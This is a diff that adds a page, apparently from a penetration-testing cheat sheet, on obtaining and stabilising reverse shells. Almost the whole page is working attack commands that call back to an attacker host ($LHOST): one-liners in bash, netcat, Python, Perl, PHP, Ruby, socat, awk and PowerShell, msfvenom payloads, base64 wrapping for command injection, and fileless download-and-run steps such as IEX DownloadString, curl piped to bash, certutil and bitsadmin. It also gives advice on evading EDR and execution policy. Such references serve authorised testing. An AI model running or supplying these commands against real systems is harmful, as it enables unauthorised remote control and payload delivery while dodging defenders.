@@ -1,0 +1,192 @@
+---
+title: "Reverse Shells"
+---
+
+Getting an interactive session back from a target: start a listener, trigger a payload, then stabilize. Placeholders: `$LHOST` is your IP, `$LPORT` your listener port (examples use `4444`).
+
+<Warning>
+Default ports like `4444` and `1234` are watched by EDR and SOC tooling. Prefer `443`, `8443`, or `53`, and rename dropped binaries before transfer.
+</Warning>
+
+## Listeners
+
+```bash wrap
+# netcat
+nc -lvnp 4444
+
+# rlwrap: arrow keys, history, and line editing on the caught shell
+rlwrap nc -lvnp 4444
+
+# pwncat-cs: auto-stabilizes the shell, adds upload/download and persistence
+pwncat-cs -lp 4444
+
+# Metasploit multi-handler
+msfconsole -q -x "use multi/handler; set payload generic/shell_reverse_tcp; set LHOST tun0; set LPORT 4444; run"
+
+# raw listener for a Windows PTY (ConPtyShell) — see below
+stty raw -echo; (stty size; cat) | nc -lvnp 4444
+```
+
+## Linux
+
+<Tabs>
+  <Tab title="bash">
+    ```bash wrap
+    bash -i >& /dev/tcp/$LHOST/4444 0>&1
+
+    # no /dev/tcp (dash/ash): use a fifo
+    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc $LHOST 4444 > /tmp/f
+
+    # base64-wrapped — survives quoting in web params and command injection
+    echo -n "bash -i >& /dev/tcp/$LHOST/4444 0>&1" | base64
+    # on target:  echo <b64> | base64 -d | bash
+    ```
+  </Tab>
+  <Tab title="nc">
+    ```bash wrap
+    # traditional netcat with -e
+    nc $LHOST 4444 -e /bin/bash
+
+    # OpenBSD netcat (no -e): fifo method
+    rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $LHOST 4444 > /tmp/f
+
+    # ncat over TLS
+    ncat --ssl $LHOST 4444 -e /bin/bash
+    ```
+  </Tab>
+  <Tab title="python">
+    ```bash wrap
+    python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("'$LHOST'",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];import pty;pty.spawn("/bin/bash")'
+    ```
+  </Tab>
+  <Tab title="other">
+    ```bash wrap
+    # perl
+    perl -e 'use Socket;$i="'$LHOST'";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
+
+    # php
+    php -r '$s=fsockopen("'$LHOST'",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
+
+    # ruby
+    ruby -rsocket -e 'c=TCPSocket.new("'$LHOST'",4444);loop{c.puts(`#{c.gets}`)}'
+
+    # socat: full pty in one shot
+    socat TCP:$LHOST:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
+
+    # awk
+    awk 'BEGIN{s="/inet/tcp/0/'$LHOST'/4444";while(1){printf"> "|&s;s|&getline c;if(c){while((c|&getline)>0)print|&s;close(c)}}}' /dev/null
+    ```
+  </Tab>
+</Tabs>
+
+## Windows
+
+<Tabs>
+  <Tab title="nc.exe">
+    ```powershell wrap
+    # -e is present in nc64.exe and most pentest nc.exe builds
+    nc.exe $LHOST 4444 -e powershell.exe
+    nc.exe $LHOST 4444 -e cmd.exe
+    ```
+  </Tab>
+  <Tab title="PowerShell">
+    ```powershell wrap
+    powershell -nop -w hidden -ep bypass -c "$c=New-Object System.Net.Sockets.TCPClient('$LHOST',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"
+    ```
+
+    ```bash wrap
+    # Base64-encode it for -enc (avoids quoting hell). On your box:
+    echo -n "$CMD" | iconv -t UTF-16LE | base64 -w0
+    # on target:  powershell -nop -w hidden -ep bypass -enc <b64>
+    ```
+  </Tab>
+  <Tab title="ConPtyShell">
+    Fully interactive Windows PTY: tab-completion, arrow keys, Ctrl+C.
+
+    ```bash wrap
+    # attacker: raw listener that forwards terminal size
+    stty raw -echo; (stty size; cat) | nc -lvnp 4444
+    ```
+    ```powershell wrap
+    # target: load and run in memory
+    powershell -nop -w hidden -ep bypass -c "IEX(IWR http://$LHOST/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell $LHOST 4444"
+    ```
+  </Tab>
+  <Tab title="msfvenom">
+    ```bash wrap
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o shell.exe
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o met.exe
+
+    # as a PowerShell command string
+    msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f psh-cmd
+    ```
+  </Tab>
+</Tabs>
+
+## Stabilizing a Shell
+
+<Tabs>
+  <Tab title="Linux">
+    ```bash wrap
+    # 1. spawn a PTY
+    python3 -c 'import pty;pty.spawn("/bin/bash")'      # or: script -qc /bin/bash /dev/null
+
+    # 2. background with Ctrl+Z, then on your box:
+    stty raw -echo; fg
+    # press Enter twice
+
+    # 3. fix the terminal
+    export TERM=xterm-256color
+    stty rows 50 cols 200        # match your local `stty size`
+    ```
+
+    See [SUID Failures in Reverse Shells](/linux/postex#suid-failures-in-reverse-shells) for why `sudo`/SUID silently fail without a real TTY.
+  </Tab>
+  <Tab title="Windows">
+    Use **ConPtyShell** (above) for a real PTY. Otherwise pivot to `evil-winrm` or RDP once you have credentials — both give a proper console.
+  </Tab>
+</Tabs>
+
+## Dropping Files on the Target
+
+Pull tools across once you have a shell (`nc.exe`, winPEAS, chisel, …). Full method matrix: [File Transfers](/file-transfers).
+
+<Tabs>
+  <Tab title="Windows — PowerShell">
+    ```powershell wrap
+    # Download to disk
+    iwr http://$LHOST/nc.exe -OutFile C:\Windows\Temp\nc.exe
+    (New-Object Net.WebClient).DownloadFile("http://$LHOST/nc.exe","C:\Windows\Temp\nc.exe")
+
+    # Fileless: execute a script straight from memory, nothing written to disk
+    IEX (New-Object Net.WebClient).DownloadString("http://$LHOST/PowerView.ps1")
+    IEX (IWR http://$LHOST/winPEAS.ps1 -UseBasicParsing)
+
+    # Drop a script and run it — always bypass execution policy
+    iwr http://$LHOST/s.ps1 -OutFile C:\ProgramData\s.ps1
+    powershell -nop -w hidden -ep bypass -f C:\ProgramData\s.ps1
+    ```
+  </Tab>
+  <Tab title="Windows — LOLBins">
+    ```cmd wrap
+    :: certutil
+    certutil -urlcache -split -f http://$LHOST/nc.exe C:\Windows\Temp\nc.exe
+
+    :: curl (Windows 10 1803+ / Server 2019+)
+    curl http://$LHOST/nc.exe -o C:\Windows\Temp\nc.exe
+
+    :: bitsadmin (background transfer job)
+    bitsadmin /transfer j /download /priority high http://$LHOST/nc.exe C:\Windows\Temp\nc.exe
+    ```
+  </Tab>
+  <Tab title="Linux">
+    ```bash wrap
+    wget http://$LHOST/linpeas.sh -O /tmp/lp.sh
+    curl http://$LHOST/linpeas.sh -o /tmp/lp.sh
+    curl http://$LHOST/linpeas.sh | bash          # pipe straight to shell, no disk write
+
+    # no wget/curl: raw HTTP over /dev/tcp
+    exec 3<>/dev/tcp/$LHOST/80; echo -e "GET /linpeas.sh HTTP/1.0\r\n\r\n" >&3; cat <&3
+    ```
+  </Tab>
+</Tabs>
